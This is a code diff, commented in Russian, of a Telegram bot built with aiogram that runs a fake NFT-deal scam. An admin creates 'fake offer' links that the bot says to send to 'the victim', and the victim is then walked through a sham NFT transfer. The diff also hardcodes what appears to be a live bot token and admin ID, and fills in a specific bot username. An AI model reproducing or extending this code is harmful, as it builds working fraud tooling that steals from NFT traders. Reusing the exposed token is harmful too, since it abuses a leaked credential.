@@ -10,8 +10,8 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, BotCommand
 
 # --- КОНФИГ ---
-BOT_TOKEN = 9033385840:AAG1xXCj-8cPl_u4DiImrpg5JXWFzE1UMu0
-ADMIN_ID = 7126242568  # Замени на свой Telegram ID
+BOT_TOKEN = "9033385840:AAG1xXCj-8cPl_u4DiImrpg5JXWFzE1UMu0"
+ADMIN_ID = 7126242568
 
 # --- БАЗА ДАННЫХ ---
 conn = sqlite3.connect('offers.db')
@@ -33,14 +33,12 @@ logging.basicConfig(level=logging.INFO)
 bot = Bot(token=BOT_TOKEN)
 dp = Dispatcher()
 
-# --- СОСТОЯНИЯ (FSM) ---
 class OfferForm(StatesGroup):
     nft_link = State()
     currency = State()
     price = State()
     lang = State()
 
-# --- УСТАНОВКА КОМАНД В МЕНЮ ---
 async def set_commands(bot: Bot):
     commands = [
         BotCommand(command="start", description="Запустить бота"),
@@ -48,7 +46,6 @@ async def set_commands(bot: Bot):
     ]
     await bot.set_my_commands(commands)
 
-# --- АДМИН ПАНЕЛЬ (СОЗДАНИЕ ОФФЕРА) ---
 @dp.message(Command("create"))
 async def start_create(message: types.Message, state: FSMContext):
     if message.from_user.id != ADMIN_ID:
@@ -100,19 +97,15 @@ async def process_lang(callback: types.CallbackQuery, state: FSMContext):
                    (token, data['nft_link'], data['currency'], data['price'], data['lang']))
     conn.commit()
     
-    # ВАЖНО: Замени 'your_fake_offer_bot' на юзернейм ТВОЕГО бота
-    fake_link = f"https://t.me/your_fake_offer_bot?start={token}"
+    fake_link = f"https://t.me/helperbabnikbot?start={token}"
     await callback.message.edit_text(f"Ссылка готова:\n\n{fake_link}\n\nКидай ее жертве.")
     await state.clear()
 
-# --- ОБРАБОТКА ЖЕРТВЫ (ФЕЙК ОФФЕР) ---
 @dp.message(Command("start"))
 async def handle_start(message: types.Message, state: FSMContext):
     args = message.text.split()
-    
-    # Если бот запущен без токена (просто /start)
     if len(args) < 2:
-        await message.answer("Привет! Это бот для сделок с NFT. Для начала сделки перейди по ссылке от продавца.")
+        await message.answer("Привет! Для начала сделки перейди по ссылке от продавца.")
         return
     
     token = args[1]
@@ -152,7 +145,7 @@ async def process_fake_transfer(callback: types.CallbackQuery):
     cursor.execute("SELECT nft_link, price, currency FROM offers WHERE token = ?", (token,))
     row = cursor.fetchone()
     if not row:
-        await callback.answer("Ошибка: оффер не найден.")
+        await callback.answer("Ошибка.")
         return
     
     nft_link, price, currency = row
@@ -164,9 +157,8 @@ async def process_fake_transfer(callback: types.CallbackQuery):
     await callback.message.edit_text(text)
     await callback.answer("Сделка завершена.")
 
-# --- ЗАПУСК ---
 async def main():
-    await set_commands(bot)  # Принудительно обновляем меню команд
+    await set_commands(bot)
     await dp.start_polling(bot)
 
 if __name__ == "__main__":
